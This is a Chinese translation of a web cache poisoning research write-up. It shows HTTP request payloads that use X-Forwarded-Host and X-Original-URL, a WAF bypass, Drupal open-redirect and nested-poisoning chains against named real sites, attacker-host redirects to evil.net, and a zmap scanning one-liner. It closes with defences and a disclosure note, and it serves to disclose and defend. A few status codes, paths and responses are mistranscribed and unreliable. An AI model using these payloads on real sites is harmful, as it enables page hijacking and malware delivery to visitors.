### 优化后的文本

#### 存储型DOM的XSS植入
我能够植入存储型DOM的跨站脚本攻击（XSS），其中包含对JSON加载的恶意响应，类似于之前提到的data.gov漏洞。

### Open Graph劫持（Open Graph Hijacking）
在另一个站点上，未加密的输入专门影响Open Graph URL：
```
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate
...
```

[Open Graph](http://ogp.me/) 是由Facebook创建的一种协议，允许网站所有者控制他们在社交媒体上分享的内容。我们通过劫持 `og:url` 参数，有效地覆盖了分享的URL，使得任何分享被投毒页面的人都会实际分享我们指定的内容。

您可能已经注意到，应用程序设置了 `Cache-Control: private`，而Cloudflare拒绝缓存此类响应。幸运的是，该网站上的其他页面明确启用了缓存：
```
GET /popularPage HTTP/1.1
Host: redacted.net
X-Forwarded-Host: evil.com
HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
Set-Cookie: session_id=942…
CF-Cache-Status: MISS
```

这里的 `CF-Cache-Status` 头是Cloudflare正在考虑缓存此响应的指示，但尽管如此，响应从未实际缓存过。我推测这可能与 `session_id` cookie有关，并尝试使用该cookie重试：
```
GET /popularPage HTTP/1.1
Host: redacted.net
Cookie: session_id=942…;
X-Forwarded-Host: attacker.com
HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
CF-Cache-Status: HIT
...
<meta property="og:url" content='https://attacker.com/…'>
```

最终，我得到了缓存的响应，并发现可以通过阅读[Cloudflare的缓存文档](https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/) 来跳过猜测。尽管缓存了响应，但“分享”结果仍然没有被投毒；Facebook显然没有达到我投毒特定Cloudflare缓存的要求。为了确定需要投毒哪个缓存，我利用了所有Cloudflare站点上的一个有用的调试功能 `/cdn-cgi/trace`：
```
colo = AMS
```

显示Facebook已经通过阿姆斯特丹的缓存访问了waf.party。目标网站是通过亚特兰大访问的，因此我在那里租了一个每月2美元的VPS并再次尝试投毒。在此之后，任何试图在其网站上共享各种页面的人都会分享我选择的内容。这是一个经过修改的攻击视频：  
[视频链接](https://portswigger.net/cms/videos/49/7c/9ace115de5b2-opengraph.mp4)

### 本地路由投毒（Local Route Poisoning）
到目前为止，我们已经看到了基于cookie的语言劫持和使用各种头文件覆盖主机的攻击。在我的研究中，我还发现了一些使用奇怪的非标准头文件的变体，例如 `translate`、`bucket` 和 `path_info`，并且怀疑遗漏了许多其他头文件。在我下载并搜索GitHub上的前20,000个PHP项目以获取头文件名称后，我的下一个重大进展来了。

这揭示了头文件 `X-Original-URL` 和 `X-Rewrite-URL`，它们可以覆盖请求的路径。我发现这些头文件会影响运行Drupal的目标，并且通过挖掘Drupal的代码发现，对此头文件的支持来自流行的PHP框架Symfony，它又是从Zend获取的代码。最终结果是大量的PHP应用程序无意中支持这些头文件。在我们尝试使用这些头文件进行缓存投毒之前，我应该指出它们也非常适合绕过WAF和安全规则：
```
GET /admin HTTP/1.1
Host: unity.com
HTTP/1.1 403 Forbidden
...
Access is denied
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin
HTTP/1.1 200 OK
...
Please log in
```

如果应用程序使用缓存，为了把头文件混淆到不正确的页面，则可能滥用这些头文件。例如，此请求的缓存键为 `/education?x=y`，但从 `/gambling?x=y` 检索内容。最终结果是，在发送此请求后，任何试图访问Unity for Education页面的人都会感到惊讶。改变页面的能力相比严重的危害更有趣点，但也许它在更大的利用链中占有一席之地。

### 内部缓存投毒（Internal Cache Poisoning）
Drupal通常与Varnish等第三方缓存一起使用，但它也包含默认启用的内部缓存。此缓存知道 `X-Original-URL` 头文件并将其包含在其缓存键中，但错误地包含头文件中的查询字符串。虽然之前的攻击让我们用另一个路径替换路径，但这个能让我们覆盖上面的查询字符串：
```
GET /search/node?keys=kittens HTTP/1.1
HTTP/1.1 220 OK
...
Search results for 'snuff'
```

离希望更进一步，但它仍然非常有限 — 我们需要第三种方法。

### Drupal开启重定向（Drupal Open Redirect）
在阅读Drupal的 `URL-override` 代码时，我注意到一个极其危险的功能 — 在所有重定向响应中，您可以使用 `destination` 查询参数覆盖重定向目标。Drupal尝试进行一些URL解析以确保它不会重定向到外部域，但这很容易绕过：
```
GET //?destination=https://evil.net\@unity.com/ HTTP/1.1
Host: unity.com
HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

在Drupal的路径中看到了双斜杠 `//` 并试图向 `/` 发出重定向来规范化它，然后目标参数启动。Drupal认为目标URL告诉人们使用用户名 `evil.net\` 访问 `unity.com`。但实际上，网络浏览器会在 `evil.net/@unity.com` 上自动将 `\` 转换为 `/`，登陆用户。再次强调，开启重定向本身并没啥作用，但现在我们终于拥有了构建高危漏洞的所有块。

### 持续重定向劫持（Persistent Redirect Hijacking）
我们可以将参数覆盖攻击与重定向结合起来，以持久地劫持任何重定向。Pinterest商业网站上的某些页面恰好通过重定向导入JavaScript。以下请求以蓝色显示缓存项，并以橙色显示参数：
```
GET /?destination=https://evil.net\@business.pinterest.com/ HTTP/1.1
Host: business.pinterest.com
X-Original-URL: /foo.js?v=1
```

这劫持了JavaScript导入文件目的地，让我可以完全控制 `business.pinterest.com` 上几个静态页面：
```
GET /foo.js?v=1 HTTP/1.1
HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

### 嵌套缓存投毒（Nested Cache Poisoning）
其他Drupal站点不那么乐于助人，也不会通过重定向导入任何重要的资源。幸运的是，如果站点使用外部缓存（几乎所有高流量的Drupal站点），我们可以使用内部缓存来投毒外部缓存，并在此过程中将任何响应转换为重定向。这是一个两阶段的攻击。首先，我们使用恶意重定向来投毒内部缓存以替换 `/redir`：
```
GET /?destination=https://evil.net\@store.unity.com/ HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

接下来，我们使用我们的预投毒 `/redir` 来投毒外部缓存以替换 `/download?v=1`：
```
GET /download?v=1 HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

最终结果是在 `unity.com` 上点击“下载安装程序”会从 `evil.net` 下载一些欺骗性恶意软件。此技术还可用于大量其他攻击，包括将欺骗性项目插入RSS源，使用网络钓鱼页替换登录页，以及通过动态脚本导入存储XSS。这是一个关于Drupal安装的此类攻击的视频：  
[视频链接](https://portswigger.net/cms/videos/5b/fe/e952b9f0eb55-drupaldemo.mp4)

该漏洞已于2018年5月29日向Drupal、Symfony和Zend团队披露，并且在希望您阅读本文时，通过协调补丁发布来禁用这些漏洞。

### 跨云投毒（Cross-Cloud Poisoning）
正如您可能已经猜到的，一些漏洞报告引发了有趣的反应和响应。使用CVSS对我的提交的报告进行评分的一个分析者，标记对CloudFront缓存投毒报告的实现难度为“high”，因为攻击者可能需要租用几个VPS才能毒害所有CloudFront的缓存。我抵制是否给定为“high”难度的争论，我把这作为一个机会，探讨是否可以在不依赖VPS的情况下进行跨区域攻击。

事实证明，CloudFront有一个有用的缓存地图，可以使用从一系列地理位置发出[免费在线服务](https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A) DNS查询以轻松识别IP地址。在舒适的卧室中使特定区域中毒就像使用curl/Burp的主机名覆盖功能将攻击定位到其中一个IP一样简单。

由于Cloudflare有更多的区域缓存，我决定也看看它们。Cloudflare在线发布所有IP地址列表，因此我编写了一个快速脚本，通过每个IP请求 `waf.party/cgn-cgi/trace` 并记录我点击的缓存：
```sh
curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80| zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
```

这表明，当针对 `waf.party`（在爱尔兰）时，我可以从曼彻斯特的家中点击以下缓存：
```
104.28.19.112 LHR    172.64.13.163 EWR    198.41.212.78 AMS
172.64.47.124 DME    172.64.32.99 SIN     108.162.253.199 MSP
172.64.9.230 IAD     198.41.238.27 AKL    162.158.145.197 YVR
```

### 防御
针对缓存投毒的最强大防御是禁用缓存。对于一些人来说，这显然是不切实际的建议，但我怀疑很多网站开始使用Cloudflare等服务进行DDoS保护或简易SSL，并且最终容易受到缓存投毒的影响，因为默认情况下启用了缓存。

如果您对定义为“静态”的内容足够谨慎，那么将缓存限制为纯静态响应也是有效的。同样，避免从头文件和cookie中获取输入是防止缓存投毒的有效方法，但很难知道其他层和框架是否在偷偷支持额外的头文件。因此，我建议使用 `Param Miner` 审核应用程序的每个页面以清除未加密的输入。

一旦在应用程序中识别出未加密的输入，理想的解决方案就是彻底禁用它们。如果不这样做，您可以剥离缓存层的输入，或将它们添加到缓存键。某些缓存允许您使用 [Vary 头](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Vary) 来键入未加密的输入，而其他缓存允许您定义自定义缓存键，但可能会将此功能限制为“企业”客户。

最后，无论您的应用程序是否具有缓存，您的某些客户端可能在其末端都有缓存，因此不应忽略HTTP头文件中的XSS等客户端漏洞。

### 结论
Web缓存投毒不仅仅是理论上的漏洞，臃肿的应用程序和高耸的服务器堆栈正在将其带入大众视野。我们已经看到，即使是著名的框架也可能隐藏无所不在的危险，从而证实假设其他人只是因为它是开源的并且拥有数百万用户而阅读了源代码，这绝不是安全的。我们还看到如何在网站放置缓存可以将其从完全安全变到极易受到攻击。我认为这是一个更大趋势的一部分，随着网站越来越依赖于辅助系统，他们的安全状况越来越难以单独进行充分评估。

最后，我为人们测试他们的知识构建了一个[小挑战](https://hackxor.net/mission?id=8)，并期待看到其他研究人员将来会在哪里采取网络缓存投毒。